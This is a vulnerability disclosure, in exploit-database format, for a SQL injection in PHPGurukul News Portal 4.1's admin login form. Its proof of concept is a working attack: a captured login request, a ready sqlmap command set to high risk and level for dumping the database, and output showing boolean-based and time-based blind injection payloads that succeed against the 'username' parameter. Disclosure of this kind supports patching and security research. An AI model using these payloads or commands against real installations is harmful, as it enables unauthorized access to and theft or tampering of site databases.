# News Portal - SQL Injection - 1
+ **Exploit Title:** News Portal - SQL Injection - 1
+ **Date:** 2024-01-04
+ **Exploit Author:** Burak Sevben
+ **Vendor Homepage:** https://phpgurukul.com/news-portal-project-in-php-and-mysql/
+ **Software Link:** https://phpgurukul.com/?sdm_process_download=1&download_id=7643
+ **Version:** 4.1
+ **Tested on:** Kali Linux + PHP 8.2.12, Apache 2.4.58
+ **CVE:** Reported, waiting for CVE number

## Description:
News Portal System  4.1 allows SQL Injection via the 'username' parameter in "http://localhost//newsportal/admin/index.php". Exploiting this issue could allow an attacker to compromise the application, access or modify data, or exploit the latest vulnerabilities in the underlying database.

## Proof of Concept:
+ Go to this address: "http://localhost//newsportal/admin/index.php"
+ Try logging in with `test`:`test`
+ Capture the request via Burp Suite and send it to the Repeater.
+ Copy the request and paste it into an "r.txt" file.
+ Captured Burp request:
```
POST /newsportal/admin/index.php HTTP/1.1
Host: localhost
Content-Length: 34
Cache-Control: max-age=0
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: http://localhost
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.78 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://localhost/newsportal/admin/index.php
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9
Cookie: language=en; continueCode=5vLeVxlRzkNb47vKDPMo5Lq8wdzLtvf1Hem0jn6EZm2ygrX19BpaQWOJY3oM; welcomebanner_status=dismiss; cookieconsent_status=dismiss; PHPSESSID=atd99ug4tbmj4a98tofev1o1ro
Connection: close

username=test&password=test&login=
```

+ Use sqlmap to exploit. In sqlmap, use 'username' parameter to dump the database.
```
sqlmap -r r.txt -p username --risk 3 --level 5 --dbms mysql --proxy="http://127.0.0.1:8080" --batch --current-db
```
```
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause (subquery - comment)
    Payload: username=test') AND 5562=(SELECT (CASE WHEN (5562=5562) THEN 5562 ELSE (SELECT 7123 UNION SELECT 6066) END))-- -&password=test&login=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=test') AND (SELECT 6744 FROM (SELECT(SLEEP(5)))VszX)-- fDAZ&password=test&login=
---
[18:13:55] [INFO] the back-end DBMS is MySQL
web application technology: PHP 8.2.12, Apache 2.4.58
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[18:13:55] [INFO] fetching current database
[18:13:55] [INFO] retrieving the length of query output
[18:13:55] [INFO] retrieved: 10
[18:13:57] [INFO] retrieved: newsportal             
current database: 'newsportal'
```
+ current database: `newsportal`

![Ekran görüntüsü 2024-04-01 011615](https://github.com/BurakSevben/CVEs/assets/117217689/fae3950c-034a-423c-a987-52bce6ef51ff)
